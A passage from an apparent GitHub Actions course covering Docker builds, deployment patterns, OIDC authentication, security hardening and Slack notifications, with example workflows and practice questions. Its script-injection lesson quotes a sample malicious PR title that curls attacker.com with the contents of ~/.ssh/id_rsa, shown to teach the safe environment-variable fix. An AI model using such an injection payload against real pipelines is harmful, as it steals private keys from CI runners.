6. **[Intermediate]** Add code coverage to your CI. Run tests with `--coverage`, upload the `lcov.info` file to `codecov` (use `codecov/codecov-action@v4`). Comment coverage percentage on PRs.

7. **[Intermediate]** Create a CI workflow that uses `actions/dependency-review-action@v4` to check for vulnerable dependencies in PRs. Configure it to fail on `high` or `critical` vulnerabilities.

8. **[Advanced]** Create a CI workflow with a Redis service. Test a rate limiting feature: your step runs a script that increments a Redis counter, checks the rate limit, and asserts the behavior. Connect via `redis-cli -h localhost`.

9. **[Advanced]** Create a multi-service integration test with: PostgreSQL (primary DB), Redis (cache), and a mock third-party API using `mockoon-cli` or a simple Python HTTP server. Your tests hit all three services.

10. **[Production Scenario]** Design a complete CI pipeline for a microservices monorepo with 3 services (frontend, backend, worker). The pipeline should:
    - Detect which service changed using `git diff`
    - Only run CI for changed services
    - Each service has its own lint, test, build jobs
    - A single `ci-gate` reports overall status
    - Branch protection requires `ci-gate` to pass before merge

---
---

## TOPIC 4.2 — Docker Build and Push

### 📖 Explanation

Building and pushing Docker images is one of the most common GitHub Actions use cases.

#### Basic Docker Build

```yaml
jobs:
  docker:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Login to Docker Hub
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: myuser/myapp:latest
```

#### Production Docker Workflow

```yaml
jobs:
  docker:
    steps:
      - uses: actions/checkout@v4

      # Login to GitHub Container Registry (GHCR) — free for public repos
      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}   # Auto-provided!

      # Extract metadata (tags and labels) for Docker
      - name: Docker metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=ref,event=branch          # branch name
            type=ref,event=pr              # pr-42
            type=semver,pattern={{version}} # v1.2.3
            type=semver,pattern={{major}}.{{minor}}  # v1.2
            type=sha                       # sha-abc1234
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}

      # Setup Buildx for multi-platform and cache support
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      # Build with cache
      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64   # Multi-arch!
          push: ${{ github.event_name != 'pull_request' }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha               # GitHub Actions cache
          cache-to: type=gha,mode=max
          build-args: |
            BUILD_VERSION=${{ github.sha }}
            BUILD_DATE=${{ github.event.head_commit.timestamp }}
```

#### Key Actions for Docker

| Action | Purpose |
|--------|---------|
| `docker/login-action@v3` | Login to any registry |
| `docker/metadata-action@v5` | Generate smart tags and labels |
| `docker/setup-buildx-action@v3` | Enable BuildKit / multi-platform |
| `docker/build-push-action@v6` | Build and push with caching |
| `docker/setup-qemu-action@v3` | For ARM cross-compilation |

---

### ✅ EXAMPLE 4.2 — Complete Docker CI/CD

```yaml
# .github/workflows/docker.yml

name: Docker Build and Push

on:
  push:
    branches: [main, develop]
    tags: ['v*']
  pull_request:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    name: Build Docker Image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write              # Required to push to GHCR

    outputs:
      image_digest: ${{ steps.build.outputs.digest }}
      image_tags: ${{ steps.meta.outputs.tags }}

    steps:
      - uses: actions/checkout@v4

      - name: Set up QEMU (for ARM builds)
        uses: docker/setup-qemu-action@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to GHCR
        if: github.event_name != 'pull_request'
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
          labels: |
            org.opencontainers.image.title=MyApp
            org.opencontainers.image.description=My production application

      - name: Build and push
        id: build
        uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: ${{ github.event_name != 'pull_request' }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true         # SLSA provenance attestation

      - name: Print image digest
        run: echo "Image digest: ${{ steps.build.outputs.digest }}"

  scan:
    name: Scan Image for Vulnerabilities
    runs-on: ubuntu-latest
    needs: build
    if: github.event_name != 'pull_request'
    steps:
      - name: Pull image
        run: docker pull ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:sha-${{ github.sha }}

      - name: Scan with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:sha-${{ github.sha }}
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy results to Security tab
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'
```

---

### 🏋️ PRACTICE SET 4.2 — 10 Questions

1. **[Beginner]** Create a simple Dockerfile for a Node.js `hello world` app. Build it in a workflow and tag it `myapp:${{ github.sha }}`. Don't push — just verify the build succeeds.

2. **[Beginner]** Create a workflow that logs into Docker Hub using `DOCKERHUB_USERNAME` and `DOCKERHUB_TOKEN` secrets, builds an image, and pushes it with tag `latest`. Verify on hub.docker.com.

3. **[Beginner]** Use `docker/metadata-action@v5` to auto-generate tags for a GitHub release. Create a release with tag `v1.0.0` and verify it produces tags `v1.0.0`, `v1.0`, and `v1`.

4. **[Intermediate]** Create a multi-platform image build (`linux/amd64` and `linux/arm64`) using `docker/setup-qemu-action` and `docker/setup-buildx-action`. Verify both platforms are present in the image manifest.

5. **[Intermediate]** Implement Docker layer caching using `type=gha`. Run the build twice and compare build times. The second run should be significantly faster.

6. **[Intermediate]** Create a workflow that builds the Docker image for PRs (to verify it builds) but only pushes for pushes to `main` (using `push: ${{ github.event_name != 'pull_request' }}`).

7. **[Intermediate]** Create a Dockerfile with `build-args` for `BUILD_VERSION` and `BUILD_DATE`. Pass them from the workflow using `build-args:` parameter. Print them in the container startup.

8. **[Advanced]** Implement Docker image scanning with `aquasecurity/trivy-action`. Fail the workflow if `CRITICAL` severity vulnerabilities are found. Upload SARIF results to GitHub Security tab.

9. **[Advanced]** Create a workflow that builds an image, pushes to GHCR, then in a downstream job deploys it to a server using SSH (`appleboy/ssh-action@master`). Pass the image tag between jobs via outputs.

10. **[Production Scenario]** Design a complete Docker CI/CD pipeline:
    - PRs: Build only (no push), run Trivy scan, post scan summary as PR comment
    - Push to `develop`: Build + push with `develop` tag + deploy to staging
    - Push to `main`: Build + push with `latest` + semantic version tags + deploy to production
    - Git tags `v*`: Build + push with version tags + create GitHub Release with image digest in release notes

---
---

## TOPIC 4.3 — Deployment Strategies

### 📖 Explanation

GitHub Actions supports multiple deployment patterns. Choosing the right one depends on your infrastructure:

#### Pattern 1: SSH Deploy
```yaml
- name: Deploy via SSH
  uses: appleboy/ssh-action@master
  with:
    host: ${{ secrets.SERVER_HOST }}
    username: ${{ secrets.SERVER_USER }}
    key: ${{ secrets.SSH_PRIVATE_KEY }}
    script: |
      cd /app
      docker pull ghcr.io/myorg/myapp:latest
      docker-compose up -d --no-deps app
```

#### Pattern 2: AWS (ECR + ECS)
```yaml
- name: Configure AWS Credentials
  uses: aws-actions/configure-aws-credentials@v4
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    aws-region: us-east-1

- name: Login to ECR
  uses: aws-actions/amazon-ecr-login@v2

- name: Deploy to ECS
  uses: aws-actions/amazon-ecs-deploy-task-definition@v1
  with:
    task-definition: task-definition.json
    service: my-service
    cluster: my-cluster
    wait-for-service-stability: true
```

#### Pattern 3: Kubernetes
```yaml
- name: Set up kubectl
  uses: azure/setup-kubectl@v3

- name: Configure kubeconfig
  run: |
    echo "${{ secrets.KUBECONFIG }}" | base64 -d > kubeconfig.yaml
    echo "KUBECONFIG=$PWD/kubeconfig.yaml" >> $GITHUB_ENV

- name: Deploy to Kubernetes
  run: |
    kubectl set image deployment/myapp \
      myapp=ghcr.io/myorg/myapp:${{ github.sha }} \
      --namespace=production
    kubectl rollout status deployment/myapp \
      --namespace=production \
      --timeout=5m
```

#### Pattern 4: GitHub Environments with Approvals
```yaml
jobs:
  deploy-staging:
    environment: staging            # Auto-configured in repo Settings
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to staging..."

  deploy-production:
    environment: production         # Requires manual approval
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to production..."
```

**Setting up environment protection rules** (GitHub UI):
- Settings → Environments → New environment → `production`
- ✅ Required reviewers (add team members)
- ✅ Wait timer (e.g., 10 minutes after staging)
- ✅ Deployment branches: `main` only

---

### ✅ EXAMPLE 4.3 — Staged Deployment with Approvals

```yaml
# .github/workflows/deploy.yml

name: Deploy Pipeline

on:
  push:
    branches: [main]

jobs:
  build:
    name: Build
    runs-on: ubuntu-latest
    outputs:
      image_tag: ghcr.io/${{ github.repository }}:${{ github.sha }}
    steps:
      - uses: actions/checkout@v4
      - name: Build (simulated)
        run: |
          echo "Building image..."
          echo "tag=ghcr.io/${{ github.repository }}:${{ github.sha }}" >> $GITHUB_OUTPUT

  deploy-dev:
    name: Deploy to Dev
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: development
      url: https://dev.example.com
    steps:
      - name: Deploy to dev
        run: |
          echo "🔧 Deploying ${{ needs.build.outputs.image_tag }} to dev"
          echo "URL: https://dev.example.com"
      - name: Run smoke tests
        run: |
          echo "Running smoke tests..."
          echo "✅ Smoke tests passed"

  deploy-staging:
    name: Deploy to Staging
    needs: [build, deploy-dev]
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - name: Deploy to staging
        run: |
          echo "🧪 Deploying ${{ needs.build.outputs.image_tag }} to staging"
      - name: Run E2E tests
        run: |
          echo "Running E2E tests..."
          sleep 5
          echo "✅ E2E tests passed"

  deploy-production:
    name: 🚀 Deploy to Production
    needs: [build, deploy-staging]
    runs-on: ubuntu-latest
    environment:
      name: production               # Has required reviewers
      url: https://example.com
    steps:
      - name: Deploy to production
        run: |
          echo "🚀 Deploying ${{ needs.build.outputs.image_tag }} to PRODUCTION"
          echo "URL: https://example.com"
      - name: Verify deployment
        run: |
          echo "Running production smoke tests..."
          echo "✅ Production deployment verified!"
      - name: Notify team
        run: |
          echo "📢 Production deploy successful!"
          echo "Image: ${{ needs.build.outputs.image_tag }}"
```

---

### 🏋️ PRACTICE SET 4.3 — 10 Questions

1. **[Beginner]** Create a workflow that deploys to a "server" by using SSH action (`appleboy/ssh-action`) to connect to a VM and run `echo "Deployed version ${{ github.sha }}"`. Set up `SSH_PRIVATE_KEY`, `SERVER_HOST`, `SERVER_USER` secrets.

2. **[Beginner]** Create a 3-stage sequential deployment: `deploy-dev` → `deploy-staging` → `deploy-production`. Each stage prints which environment it's deploying to. Add `environment:` declarations.

3. **[Beginner]** Set up a `production` environment in GitHub with a required reviewer. Create a workflow that deploys to it. Observe the manual approval gate in the Actions UI.

4. **[Intermediate]** Create an AWS ECS deployment workflow using `aws-actions/configure-aws-credentials@v4` and `aws-actions/amazon-ecs-deploy-task-definition@v1`. Use mock secrets (you can point to a localstack or skip actual execution with `if: false`).

5. **[Intermediate]** Create a Kubernetes deployment workflow that:
   - Builds and pushes a Docker image
   - Updates a K8s deployment image with `kubectl set image`
   - Waits for rollout with `kubectl rollout status --timeout=5m`
   - Rolls back with `kubectl rollout undo` if health check fails

6. **[Intermediate]** Implement a **canary deployment** pattern: deploy to 20% of instances first (`kubectl scale`), run a health check, then scale to 100%. If health check fails, scale canary back to 0%.

7. **[Intermediate]** Create a deployment that posts environment URL as a deployment status to GitHub. Use `actions/github-script` to call `github.rest.repos.createDeploymentStatus` with `state: 'success'` and `environment_url`.

8. **[Advanced]** Implement **blue-green deployment**: you have two identical environments (blue and green). Deploy to the inactive one, run tests, then switch the load balancer. Simulate with environment variables `ACTIVE_ENV` and `INACTIVE_ENV`.

9. **[Advanced]** Create a rollback mechanism: if the `deploy-production` job fails, automatically trigger a rollback job that deploys the previous successful image tag (store last good tag in a GitHub variable or artifact).

10. **[Production Scenario]** Build a complete CD pipeline for a Kubernetes app:
    - On push to `main`: Build image → Push to registry → Deploy to `dev` (auto)
    - On success in `dev`: Deploy to `staging` (auto, but wait 5 min)
    - Manual approval required for `production`
    - Each environment verifies deployment with health check
    - Slack notification on production deploy success/failure
    - Automatic rollback if production health check fails

---
---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DAY 5 — PRODUCTION PATTERNS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

---

## TOPIC 5.1 — OIDC Authentication (Keyless)

### 📖 Explanation

**OIDC (OpenID Connect)** lets GitHub Actions authenticate to cloud providers **WITHOUT storing long-lived credentials as secrets**. Instead, GitHub issues a short-lived JWT token that cloud providers trust.

**Traditional approach (BAD):**
```yaml
# ❌ Long-lived secrets that never expire
secrets:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**OIDC approach (GOOD):**
```yaml
# ✅ No stored credentials — GitHub gets a temp token each run
permissions:
  id-token: write     # Required to get OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1
          # No access key or secret key needed!
```

**How to set up AWS OIDC:**
```hcl
# Terraform (or do this in AWS Console):
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

resource "aws_iam_role" "github_actions" {
  name = "GitHubActionsRole"
  assume_role_policy = jsonencode({
    Statement = [{
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringLike = {
          "token.actions.githubusercontent.com:sub" =
            "repo:myorg/myrepo:*"     # Scoped to your repo!
        }
      }
    }]
  })
}
```

**GCP OIDC:**
```yaml
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/...'
    service_account: 'github-actions@project.iam.gserviceaccount.com'
```

**Azure OIDC:**
```yaml
- uses: azure/login@v2
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
    # No client secret — uses OIDC federated identity!
```

---

### ✅ EXAMPLE 5.1 — AWS OIDC Deploy

```yaml
# .github/workflows/aws-oidc-deploy.yml

name: AWS OIDC Deployment

on:
  push:
    branches: [main]

permissions:
  id-token: write           # Required for OIDC
  contents: read

jobs:
  deploy:
    name: Deploy to AWS
    runs-on: ubuntu-latest
    environment: production

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          role-session-name: GitHubActions-${{ github.run_id }}
          aws-region: us-east-1

      - name: Verify AWS identity (debug)
        run: aws sts get-caller-identity

      - name: Login to Amazon ECR
        uses: aws-actions/amazon-ecr-login@v2

      - name: Build and push to ECR
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
          IMAGE_TAG: ${{ github.sha }}
        run: |
          docker build -t $ECR_REGISTRY/myapp:$IMAGE_TAG .
          docker push $ECR_REGISTRY/myapp:$IMAGE_TAG

      - name: Deploy to ECS
        run: |
          aws ecs update-service \
            --cluster production \
            --service myapp \
            --force-new-deployment

      - name: Wait for deployment
        run: |
          aws ecs wait services-stable \
            --cluster production \
            --services myapp
          echo "✅ Deployment stable!"
```

---

### 🏋️ PRACTICE SET 5.1 — 10 Questions

1. **[Beginner]** What is the difference between OIDC-based auth and static credentials? Write a detailed comparison as workflow comments. Create two versions of the same deploy step — one with static secrets, one with OIDC — and note the security difference.

2. **[Beginner]** Create a workflow with `permissions: id-token: write`. Add a step that prints the OIDC token (for educational purposes): `OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")`. Print the decoded header (first part before first `.`).

3. **[Beginner]** Show what happens when `permissions: id-token: write` is MISSING. Observe the error when trying to get an OIDC token. Then fix it by adding the permission.

4. **[Intermediate]** Set up AWS OIDC (if you have an AWS account) or simulate it by showing all the Terraform/CloudFormation resources needed. Create an IAM role that only trusts your specific repo (`repo:yourorg/yourrepo:ref:refs/heads/main`).

5. **[Intermediate]** Create a workflow that uses OIDC to authenticate to AWS and then runs a series of AWS CLI commands: list S3 buckets, describe EC2 instances, get ECR images. Use a restrictive IAM role that only allows read actions.

6. **[Intermediate]** Show how to scope OIDC to specific environments. Create one role for `staging` (trusts `environment:staging`) and one for `production` (trusts `environment:production`). Demonstrate that the staging job cannot assume the production role.

7. **[Intermediate]** Create a GCP OIDC workflow using `google-github-actions/auth@v2`. Authenticate and then use `gcloud` to list Cloud Run services. Document the Workload Identity setup in comments.

8. **[Advanced]** Implement a multi-cloud OIDC workflow: authenticate to both AWS and GCP in the same job. Deploy an artifact to both clouds. This demonstrates the power of OIDC — no credential management needed.

9. **[Advanced]** Create a security-hardened workflow using OIDC where:
   - The role ARN is stored as a non-secret repo variable (it's not sensitive)
   - The role trust policy is scoped to specific branches (`main` only)
   - Token expiration is set to minimum (15 minutes)
   - Audit logging step calls `aws cloudtrail lookup-events` after deploy

10. **[Production Scenario]** Migrate a production workflow from static AWS credentials to OIDC:
    - Before: Uses `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` secrets
    - After: Uses OIDC with properly scoped IAM role
    - Document the trust policy required
    - Add a check that verifies the assumed role ARN matches expected
    - Show how to rotate/invalidate the old static credentials after migration

---
---

## TOPIC 5.2 — Security Hardening

### 📖 Explanation

Production workflows need to be secured against supply chain attacks, secret leaks, and privilege escalation.

#### Permissions (Principle of Least Privilege)

```yaml
# Workflow-level: restrict all jobs
permissions:
  contents: read       # Read repo code
  # All other permissions are NONE by default

jobs:
  build:
    # Job-level: grant additional permissions for this job only
    permissions:
      contents: read
      packages: write    # Needed to push to GHCR
    steps: ...

  pr-comment:
    permissions:
      pull-requests: write  # Only this job can comment on PRs
    steps: ...
```

**All permission types:**
```yaml
permissions:
  actions: read|write|none
  checks: read|write|none
  contents: read|write|none
  deployments: read|write|none
  id-token: write|none        # Required for OIDC
  issues: read|write|none
  packages: read|write|none
  pull-requests: read|write|none
  security-events: read|write|none
  statuses: read|write|none
```

#### Pin Action Versions by SHA

```yaml
# ❌ BAD — tag can be changed maliciously (supply chain attack)
uses: actions/checkout@v4

# ✅ GOOD — pinned to exact commit SHA
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# With a comment showing the tag for readability
uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
```

#### Prevent Script Injection

```yaml
# ❌ VULNERABLE — PR title injected into shell
- run: echo "PR title is ${{ github.event.pull_request.title }}"
# Attack: PR title = "; curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)"

# ✅ SAFE — pass through env var (doesn't get shell-interpreted)
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

#### Security Scanning Actions

```yaml
# CodeQL — SAST scanning
- uses: github/codeql-action/init@v3
  with:
    languages: javascript, python

- uses: github/codeql-action/analyze@v3

# Trivy — Container and filesystem scanning
- uses: aquasecurity/trivy-action@master
  with:
    scan-type: 'fs'
    scan-ref: '.'
    severity: 'CRITICAL,HIGH'

# OSSF Scorecard — Supply chain security score
- uses: ossf/scorecard-action@v2.3.1
  with:
    results_file: results.sarif
    publish_results: true

# Dependency review for PRs
- uses: actions/dependency-review-action@v4
  with:
    fail-on-severity: high
```

---

### ✅ EXAMPLE 5.2 — Security-Hardened Workflow

```yaml
# .github/workflows/secure-ci.yml

name: Security-Hardened CI

on:
  push:
    branches: [main]
  pull_request:

# Workflow-level: restrict to minimum
permissions:
  contents: read

jobs:
  security-scan:
    name: 🔒 Security Scanning
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write   # To upload SARIF

    steps:
      # Pin to SHA! (get SHA from action's releases page)
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Run Trivy filesystem scan
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8 # pinned
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH,MEDIUM'

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

  codeql:
    name: 🔍 CodeQL Analysis
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
      actions: read

    strategy:
      matrix:
        language: [javascript]

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3

      - name: Run CodeQL Analysis
        uses: github/codeql-action/analyze@v3

  safe-pr-handling:
    name: ✅ Safe PR Processing
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    permissions:
      pull-requests: write
      contents: read

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      - name: Safe PR title (injection-protected)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          echo "Processing PR #$PR_NUMBER"
          echo "Title: $PR_TITLE"
          echo "Author: $PR_AUTHOR"

      - name: Dependency review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-2.0, GPL-3.0
```

---

### 🏋️ PRACTICE SET 5.2 — 10 Questions

1. **[Beginner]** Take an existing workflow and add minimal `permissions:` at the top-level. Set everything to `none` first, then only add the permissions that each job actually needs. Verify each job still works.

2. **[Beginner]** Find the SHA for `actions/checkout@v4`, `actions/setup-node@v4`, and `docker/build-push-action@v6`. Update a workflow to pin all actions by SHA (with the tag as a comment). This is a security best practice.

3. **[Beginner]** Create a deliberately vulnerable workflow where a PR title is injected into a `run:` command directly. Then fix it by passing through an environment variable. Show the before/after diff.

4. **[Intermediate]** Set up CodeQL scanning for a JavaScript or Python project. Configure it to run on push to `main` and on PRs. View the security findings in the GitHub "Security" tab.

5. **[Intermediate]** Add `actions/dependency-review-action@v4` to a PR workflow. Configure it to fail on `high` or `critical` vulnerabilities. Test by adding a known vulnerable package version to `package.json`.

6. **[Intermediate]** Create a workflow that uses `GITHUB_TOKEN` but with different permission levels. Show which GitHub API calls succeed with `contents: read` vs `contents: write`. Try creating a release with `read` and observe the failure.

7. **[Intermediate]** Implement secret scanning: use a tool like `truffleHog` or `gitleaks` in a GitHub Action to scan commit history for accidentally committed secrets. Configure it to run on every PR.

8. **[Advanced]** Set up OSSF Scorecard (`ossf/scorecard-action`) for your repository. Review the resulting score card. Identify 3 improvements you can make to the workflow to improve the score.

9. **[Advanced]** Implement a `validate-workflow` job that uses `actionlint` (GitHub Actions linter) to verify all workflow YAML files in `.github/workflows/` for syntax and best practice errors before the actual CI runs.

10. **[Production Scenario]** Conduct a security audit of an existing CI/CD workflow and apply hardening:
    - Pin ALL action versions to SHAs
    - Add minimal `permissions:` to all jobs
    - Fix any script injection vulnerabilities
    - Add Trivy scanning to Docker builds
    - Add CodeQL to catch SAST issues
    - Add dependency review to PRs
    - Add `continue-on-error: false` explicitly on security steps
    - Document each change with a security justification comment

---
---

## TOPIC 5.3 — Notifications and Monitoring

### 📖 Explanation

Keeping your team informed about workflow status is critical in production.

#### Slack Notifications

```yaml
# Method 1: Slack Incoming Webhook
- name: Notify Slack
  if: always()
  uses: rtCamp/action-slack-notify@v2
  env:
    SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
    SLACK_CHANNEL: '#deployments'
    SLACK_COLOR: ${{ job.status }}   # good/danger/warning
    SLACK_TITLE: 'Deployment Status'
    SLACK_MESSAGE: |
      *Repo:* ${{ github.repository }}
      *Branch:* ${{ github.ref_name }}
      *Status:* ${{ job.status }}
      *Actor:* ${{ github.actor }}
      *Run:* ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}

# Method 2: Slack API directly
- name: Post Slack message
  uses: slackapi/slack-github-action@v1.27.0
  with:
    payload: |
      {
        "channel": "#deployments",
        "text": "Deploy ${{ job.status }}: ${{ github.repository }}",
        "attachments": [{
          "color": "${{ job.status == 'success' && '#2eb886' || '#e01e5a' }}",
          "fields": [
            {"title": "Branch", "value": "${{ github.ref_name }}", "short": true},
            {"title": "Actor", "value": "${{ github.actor }}", "short": true}
          ]
        }]
      }
  env:
    SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
```

#### PR Comments

```yaml
- name: Comment on PR
  uses: actions/github-script@v7
  if: github.event_name == 'pull_request'
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    script: |
      const { data: comments } = await github.rest.issues.listComments({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
      });

      const botComment = comments.find(c => c.user.type === 'Bot' && c.body.includes('CI Results'));

      const body = `## CI Results 🤖
      | Check | Status |
      |-------|--------|
      | Tests | ✅ Passed |
      | Coverage | 87% |
      | Security | ✅ No issues |`;

      if (botComment) {
        await github.rest.issues.updateComment({
          comment_id: botComment.id,
          owner: context.repo.owner,
          repo: context.repo.repo,
          body,
        });
      } else {
        await github.rest.issues.createComment({
          issue_number: context.issue.number,
          owner: context.repo.owner,
          repo: context.repo.repo,
          body,
        });
      }
```

#### Job Summary (GitHub's built-in dashboard)

```yaml
- name: Write to job summary
  run: |
    echo "## Build Summary 📊" >> $GITHUB_STEP_SUMMARY
    echo "" >> $GITHUB_STEP_SUMMARY
    echo "| Metric | Value |" >> $GITHUB_STEP_SUMMARY
    echo "|--------|-------|" >> $GITHUB_STEP_SUMMARY
    echo "| Build | #${{ github.run_number }} |" >> $GITHUB_STEP_SUMMARY
    echo "| Branch | ${{ github.ref_name }} |" >> $GITHUB_STEP_SUMMARY
    echo "| Status | ✅ Success |" >> $GITHUB_STEP_SUMMARY
    echo "| Tests | 147 passed |" >> $GITHUB_STEP_SUMMARY
    echo "| Coverage | 92% |" >> $GITHUB_STEP_SUMMARY
```

---

### ✅ EXAMPLE 5.3 — Complete Notification Strategy

```yaml
# .github/workflows/notify.yml

name: Deploy with Notifications

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build application
        run: |
          echo "Building..."
          sleep 2
          echo "Build complete!"

      - name: Deploy
        id: deploy
        run: |
          echo "Deploying..."
          echo "deploy_url=https://myapp.example.com" >> $GITHUB_OUTPUT

      - name: Write Job Summary
        if: always()
        run: |
          echo "## 🚀 Deployment Summary" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "| Field | Value |" >> $GITHUB_STEP_SUMMARY
          echo "|-------|-------|" >> $GITHUB_STEP_SUMMARY
          echo "| Status | ${{ job.status == 'success' && '✅ Success' || '❌ Failed' }} |" >> $GITHUB_STEP_SUMMARY
          echo "| Commit | \`${{ github.sha }}\` |" >> $GITHUB_STEP_SUMMARY
          echo "| Triggered by | @${{ github.actor }} |" >> $GITHUB_STEP_SUMMARY
          echo "| App URL | ${{ steps.deploy.outputs.deploy_url }} |" >> $GITHUB_STEP_SUMMARY
          echo "| Run | [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}) |" >> $GITHUB_STEP_SUMMARY

      - name: Notify Slack on success
        if: success()
        uses: slackapi/slack-github-action@v1.27.0
        with:
          payload: |
            {
              "text": "✅ Deploy succeeded",
              "attachments": [{
                "color": "#2eb886",
                "fields": [
                  {"title": "Repo", "value": "${{ github.repository }}", "short": true},
                  {"title": "Actor", "value": "${{ github.actor }}", "short": true},
                  {"title": "URL", "value": "${{ steps.deploy.outputs.deploy_url }}", "short": false}
                ]
              }]
            }
        env:
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}

      - name: Notify Slack on failure
        if: failure()
        uses: slackapi/slack-github-action@v1.27.0
        with:
          payload: |
            {
              "text": "❌ Deploy FAILED — @here please investigate!",
              "attachments": [{
                "color": "#e01e5a",
